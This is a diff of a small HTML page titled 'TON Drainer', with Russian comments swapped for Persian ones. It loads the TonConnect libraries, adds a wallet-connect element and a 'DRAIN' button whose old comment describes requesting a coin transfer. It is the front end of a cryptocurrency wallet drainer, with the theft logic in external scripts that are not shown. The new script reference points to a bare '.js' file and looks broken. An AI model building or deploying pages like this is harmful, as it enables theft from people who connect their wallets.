@@ -1,28 +1,23 @@
 <!DOCTYPE html>
-<html>
+<html lang="fa" dir="rtl">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TON Drainer</title>
     
-    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <!-- بارگذاری کتابخانه‌های TonConnect -->
     <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
-    
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 </head>
 <body>
 
+    <!-- محل نمایش دکمه‌ی اتصال کیف‌پول -->
+    <div id="ton-connect"></div>
 
+    <!-- دکمه‌ی تخلیه -->
+    <button id="drainBtn" style="margin-top:30px; font-size:24px;">DRAIN</button>
 
-<div id="ton-connect"></div>  <!--Коннект кошелька-->
-<button onclick="didtrans();" style="MARGIN-TOP:30PX;FONT-SIZE:24PX;">DRAIN</button><!--Запрос трансфера монет-->
-
-
-
-
-<script src="tonsdk.js"></script>
- 
-    
-
-
-
+    <!-- بارگذاری فایل جاوااسکریپت اصلی -->
+    <script src=".js"></script>
 </body>
-
-
 </html>
